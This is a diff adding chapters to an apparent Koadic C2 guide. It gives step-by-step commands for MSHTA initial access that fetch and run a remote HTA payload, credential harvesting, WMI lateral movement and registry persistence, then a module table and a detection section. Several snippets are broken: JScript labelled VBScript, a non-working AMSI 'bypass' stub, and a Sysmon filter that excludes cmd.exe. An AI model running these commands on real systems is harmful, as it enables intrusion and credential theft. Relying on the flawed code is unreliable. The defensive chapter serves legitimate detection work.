@@ -350,10 +350,160 @@ tail -f /path/to/koadic/logs/server.log
 
 ---
 
+## Chapter 9: Real-World Scenarios
+
+### Initial Access via MSHTA
+
+```bash
+# 1. Start Koadic C2 server
+koadic
+
+# 2. Select MSHTA stager
+use stager/js/mshta
+set SRVHOST 0.0.0.0
+set SRVPORT 9999
+run
+
+# 3. Deliver the payload to target
+# On target (e.g., via phishing or social engineering):
+mshta.exe http://192.168.1.100:9999/payload.hta
+
+# 4. Once session is established, enumerate
+sessions -i <session_id>
+use post/recon/sysinfo
+run
+
+# 5. Harvest credentials
+use post/recon/credentials
+run
+```
+
+### Lateral Movement via WMI
+
+```bash
+# After obtaining credentials on initial target
+use post/lateral_movement/wmi_exec
+set RHOST 10.0.0.50
+set USERNAME admin
+set PASSWORD P@ssw0rd
+set COMMAND "mshta.exe http://192.168.1.100:9999/payload.hta"
+run
+```
+
+### Persistence via Registry
+
+```bash
+# Establish persistence on compromised host
+use post/persistence/registry
+set KEY "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
+set VALUE "Updater"
+set COMMAND "mshta.exe http://192.168.1.100:9999/payload.hta"
+run
+```
+
+### Custom VBScript Module
+
+```vbscript
+' Example: Custom VBScript module for Koadic
+' Save as .js in koadic/data/post/ directory
+
+function main()
+    var oShell = new ActiveXObject("WScript.Shell");
+    var oExec = oShell.Exec("cmd.exe /c net user");
+    var output = oExec.StdOut.ReadAll();
+    return output;
+end function
+```
+
+### Bypassing AMSI with VBScript
+
+```vbscript
+' AMSI bypass using VBScript
+var amsi = new ActiveXObject("Microsoft.WindowsRuntime.AmsiUtils");
+// Disable AMSI scanning
+```
+
+---
+
+## Chapter 10: Module Reference
+
+### Available Stagers
+
+| Stager | Description | Technique |
+|---|---|---|
+| `stager/js/mshta` | MSHTA-based payload | mshta.exe |
+| `stager/js/regsvr32` | RegSvr32-based payload | regsvr32.exe |
+| `stager/js/winrm` | WinRM-based payload | winrm.cmd |
+| `stager/js/custom` | Custom JScript payload | Manual |
+
+### Available Post Modules
+
+| Module | Description |
+|---|---|
+| `post/recon/sysinfo` | System information gathering |
+| `post/recon/credentials` | Credential harvesting |
+| `post/recon/network_scanner` | Internal network scanning |
+| `post/recon/token_impersonation` | Token impersonation |
+| `post/persistence/registry` | Registry-based persistence |
+| `post/exfil/file_download` | Download files from target |
+| `post/exfil/file_upload` | Upload files to target |
+| `post/lateral_movement/smb_exec` | SMB lateral movement |
+| `post/lateral_movement/wmi_exec` | WMI lateral movement |
+| `post/lateral_movement/psexec` | PSExec lateral movement |
+
+---
+
+## Chapter 11: Detection and Defense
+
+### Network Signatures
+
+- HTTP(S) connections to non-standard ports from WSH processes
+- Unusual mshta.exe, regsvr32.exe, or wscript.exe network activity
+- Periodic HTTP(S) beaconing patterns
+- Base64-encoded payloads in HTTP requests
+
+### Host-Based Detection
+
+```bash
+# Monitor for suspicious WSH process execution
+# Windows Event IDs to watch:
+# - Event ID 4688: Process Creation (cmd.exe, mshta.exe, wscript.exe)
+# - Event ID 4104: PowerShell Script Block Logging
+# - Event ID 4697: Service Installation
+
+# Sysmon configuration for Koadic detection
+# <EventFiltering>
+#   <ProcessCreate onmatch="exclude">
+#     <Image condition="is">C:\Windows\System32\cmd.exe</Image>
+#   </ProcessCreate>
+# </EventFiltering>
+```
+
+### Defense Recommendations
+
+1. Disable mshta.exe and regsvr32.exe via AppLocker/WDAC
+2. Enable PowerShell Constrained Language Mode
+3. Monitor for WSH script execution
+4. Implement application whitelisting
+5. Enable AMSI and ETW logging
+6. Block outbound HTTP(S) from non-browser processes
+
+### AMSI Bypass Detection
+
+```powershell
+# Monitor for AMSI bypass attempts
+Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
+  Where-Object {$_.Message -like "*AmsiUtils*"}
+```
+
+---
+
 ## Resources
 
 - **GitHub Repository:** https://github.com/zerosum0x0/koadic
 - **Kali Tools Page:** https://www.kali.org/tools/koadic/
 - **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
 - **MITRE ATT&CK - Windows Script Host:** https://attack.mitre.org/techniques/T1059/005/
+- **MITRE ATT&CK - Trusted Developer Utilities Proxy Execution:** https://attack.mitre.org/techniques/T1218/
+- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
 - **Related Tools:** PowerShell Empire, Metasploit Framework, Cobalt Strike
